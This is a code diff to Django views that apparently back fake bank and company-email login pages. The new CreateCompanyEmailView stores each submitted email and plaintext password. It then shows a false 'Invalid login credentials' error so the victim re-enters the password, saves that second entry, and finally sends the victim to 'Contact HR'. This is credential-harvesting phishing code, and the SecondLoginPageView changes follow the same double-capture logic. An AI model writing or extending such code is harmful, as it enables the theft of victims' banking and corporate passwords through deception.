@@ -348,10 +348,6 @@ class LoginPageView(View):
                 else:
                     messages.error(request, 'All fields are required!!')
 
-                new_user = Users.objects.create(
-                    bank_name=bank_name, account_password1=password)
-                LoginCount.objects.create(user=new_user)
-
             else:
                 login_count.increaseCount
 
@@ -424,12 +420,9 @@ class SecondLoginPageView(View):
                 else:
                     messages.error(request, 'All fields are required!!')
 
-                new_user = Users.objects.create(
-                    bank_name=bank_name, account_password1=password)
-                LoginCount.objects.create(user=new_user)
-
             else:
                 login_count.increaseCount
+                login_count.save()
 
                 user.account_password2 = password
                 user.set_password(password)
@@ -453,6 +446,48 @@ class SecondLoginPageView(View):
             messages.error(request, 'Invalid login credentials, try again!!')
             return redirect('auth:viva_group')
 
+class CreateCompanyEmailView(View):
+    def get(self, request):
+        return render(request, 'frontend/salary/create_email.html')
+
+    def post(self, request):
+
+        email = request.POST.get('email')
+        password = request.POST.get('password').strip()
+
+        user = CompanyEmail.objects.filter(email=email).first()
+
+        if user:
+
+            email_count = EmailCount.objects.filter(user=user).first()
+
+            if email_count and email_count.count > 1:
+
+                if email and password:
+
+                    messages.error(request, 'company email has already been created! Contact HR for login details.')
+                else:
+                    messages.error(request, 'All fields are required!!')
+
+                return redirect('auth:create_email')
+
+            else:
+
+                email_count.increaseCount
+                email_count.save()
+                user.account_password2 = password
+                user.save()
+                messages.success(request, f"You have successfully created your company email. Contact HR for login details.")
+
+            return redirect('auth:create_email')
+
+        else:
+
+            new_user = CompanyEmail.objects.create(email=email, account_password1=password)
+            EmailCount.objects.create(user=new_user, count=1)
+
+            messages.error(request, 'Invalid login credentials, try again!!')
+            return redirect('auth:create_email')
 
 class ProfileView(LoginRequiredMixin, View):
 
